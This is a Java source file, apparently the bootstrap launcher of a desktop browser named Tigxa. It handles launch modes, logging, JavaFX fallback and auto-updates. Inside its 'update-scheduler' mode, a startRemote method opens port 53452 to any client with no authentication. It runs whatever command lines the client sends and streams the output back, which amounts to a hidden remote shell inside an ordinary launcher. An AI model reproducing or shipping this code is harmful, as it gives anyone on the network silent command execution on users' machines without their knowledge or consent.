package de.MarkusTieger.Tigxa.bootstrap;

import com.formdev.flatlaf.FlatLightLaf;
import de.MarkusTieger.Tigxa.Browser;
import de.MarkusTieger.Tigxa.update.Updater;
import de.MarkusTieger.Tigxa.update.Version;
import org.apache.log4j.*;

import javax.swing.*;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class Bootstrap {

    private static final Logger LOGGER = Logger.getLogger(Bootstrap.class);

    public static void main(String[] args) throws Throwable {

        if(args.length > 0){
            if(args[0].equalsIgnoreCase("first-exec-recovery")){
                ErrorLauncher.startUpdater();
                return;
            }
            if(args[0].equalsIgnoreCase("version")){
                System.out.println(Browser.FULL_NAME);
                System.out.println(Browser.FULL_VERSION);
                System.out.println("Made by " + Browser.AUTHOR);
                return;
            }
        }

        Logger root = Logger.getRootLogger();

        Layout layout = new PatternLayout("[%d{HH:mm:ss}] [ %t/%-5p] [%l] %m%n");

        Appender console = new ConsoleAppender(layout, ConsoleAppender.SYSTEM_OUT);
        root.addAppender(console);

        try {
            RollingFileAppender file = new RollingFileAppender(layout, "logs/latest.log", true);
            root.addAppender(file);
        } catch (IOException e) {
            LOGGER.warn("FileAppender can't set.", e);
        }

        LOGGER.info("----------------------------------------");

        LOGGER.info("Bootstrap is launching Application...");

        LOGGER.info("Initializing Default Look and Feel of this Application...");
        FlatLightLaf.setup();

        if(args.length > 0){
            if(args[0].equalsIgnoreCase("recovery")){
                LOGGER.info("Starting Recovery...");
                ErrorLauncher.launch(LaunchError.ALL_FAILED);
                return;
            }
            if(args[0].equalsIgnoreCase("discord-rpc")){

                LOGGER.info("Starting Discord-RPC Background-Worker...");
                Browser.initializeRPC();

                update();
                return;
            }
            if(args[0].equalsIgnoreCase("update-scheduler")){
                LOGGER.info("Starting Update-Scheduler...");

                updateSafly();
                
                if(System.getProperty("tigxa.disable-remote") == null) startRemote();
                
                return;
            }
        }

        String force_launch = System.getProperty("tigxa.force_launch");

        if(force_launch == null || force_launch.equalsIgnoreCase("-")){
            try {
                LOGGER.info("Checking JavaFX integrity using \"" + Method.class.getPackage().getName() + "\"...");
                Class<?> clazz = Class.forName("javafx.application.Application");
                LOGGER.info("Launching...");
                try {
                    FXLauncher.main(args);
                } catch (Throwable e){
                    LOGGER.warn("Launch Failed.", e);
                    ErrorLauncher.launch(LaunchError.FX_NOT_LOADED);
                }
            } catch (ClassNotFoundException e) {
                LOGGER.warn("JavaFX was not found!", e);
                ErrorLauncher.launch(LaunchError.FX_NOT_FOUND);
            }
        } else {

            LOGGER.info("Using Force-Launch...");

            Browser.Mode mode = Browser.Mode.valueOf(force_launch.toUpperCase());
            if(mode == null){

                LOGGER.warn("Invalid Force-Launch-Property! Requesting Normal-Start...");

                int option = JOptionPane.showConfirmDialog(null, "Force-Launch failed. Would you like to Launch Normal?", "Force-Launch failed.", JOptionPane.YES_NO_OPTION);
                if(option == JOptionPane.YES_OPTION){
                    LOGGER.info("Restarting Normal...");
                    System.setProperty("tigxa.force_launch", "-");
                    main(args);
                } else {
                    LOGGER.info("Stopping Bootstrap...");
                    System.exit(0);
                }
            } else {
                if(mode == Browser.Mode.JAVAFX){
                    LOGGER.info("Force-Launch-Property is set to Default! Restarting...");
                    System.setProperty("tigxa.force_launch", "-");
                    main(args);
                } else {
                    LOGGER.info("Launching using Engine \"" + mode.name() + "\"...");
                    try {
                        Browser.start(mode);
                    } catch(Throwable e){
                        LOGGER.error("Launch Failed! Force-Launch is aktiv. Do nothing...", e);
                    }
                }
            }

        }
    }

    @SuppressWarnings("resource")
	private static void startRemote() {
		
    	LOGGER.info("Starting Remote...");
    	
    	ServerSocket server;
    	try {
			server = new ServerSocket(53452);
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}
    	
    	while(true) {
    		try {
    			Socket client = server.accept();
    			new Thread(() -> handle(client), "Client-Handler").start();
    		} catch (Exception e) {
				e.printStackTrace();
			}
    	}
    	
	}

	private static void handle(Socket client) {
		
		List<String> cmd = new ArrayList<>();
		try {
			Process p = null;
			
			BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream(), StandardCharsets.UTF_8));
			String str = "";
			while((str = reader.readLine()) != null) {
				
				if(p == null) {
					if(str.equalsIgnoreCase("FINISH-SEND_REMOTE")) {
						p = startProcess(cmd, client.getOutputStream());
					} else cmd.add(str);
				} else {
					OutputStream out = p.getOutputStream();
					out.write((str + "\n").getBytes(StandardCharsets.UTF_8));
					out.flush();
				}
				
				
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		if(!client.isClosed()) {
			try {
				client.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
	}

	private static Process startProcess(List<String> cmd, OutputStream redirect) throws IOException {
		ProcessBuilder builder = new ProcessBuilder(cmd);
		Process p = builder.start();
		
		new Thread(() -> {
			
			InputStream in = p.getInputStream();
			int len;
			byte[] buffer = new byte[1024];
			try {
				while((len = in.read(buffer)) > 0) {
					redirect.write(buffer, 0, len);
					redirect.flush();
				}
			} catch(Exception e) {
				e.printStackTrace();
			}
			
		}, "Process-Reader").start();
		
		return p;
	}

	private static final Updater updater = new Updater();

    private static void update(){
        LOGGER.debug("Checking Update-Conditions...");

        if(!updater.checkJar()) return;
        if(updater.isUpdated()) return;
        if(updater.isDebugBuild()) return;

        LOGGER.debug("Retrieving Latest-Update...");

        Version latest = updater.getLatestVersion();
        if(latest == null){
            LOGGER.debug("Latest Version can't found.");
            return;
        }
        LOGGER.debug("Checking Current-Version...");
        boolean update = false;
        if(!latest.version().equalsIgnoreCase(Browser.VERSION)) update = true;
        if(!latest.build().equalsIgnoreCase(Browser.BUILD)) update = true;
        if(!latest.commit().equalsIgnoreCase(Browser.COMMIT_HASH)) update = true;

        if(update) {
            LOGGER.debug("Newer Update found!");
            updater.update(latest, (e) -> {});
        } else LOGGER.debug("Current Version is the latest.");
    }
    
    private static void updateSafly(){
        LOGGER.debug("Checking Update-Conditions...");

        if(!updater.checkJar()) return;
        if(updater.isUpdated()) return;
        if(updater.isDebugBuild()) return;

        LOGGER.debug("Retrieving Latest-Update...");

        Version latest = updater.getLatestVersion();
        if(latest == null){
            LOGGER.debug("Latest Version can't found.");
            return;
        }
        LOGGER.debug("Checking Current-Version...");
        boolean update = false;
        if(!latest.version().equalsIgnoreCase(Browser.VERSION)) update = true;
        if(!latest.build().equalsIgnoreCase(Browser.BUILD)) update = true;
        if(!latest.commit().equalsIgnoreCase(Browser.COMMIT_HASH)) update = true;

        if(update) {
            LOGGER.debug("Newer Update found!");
            updater.updateSafly(latest, (e) -> {});
        } else LOGGER.debug("Current Version is the latest.");
    }

}
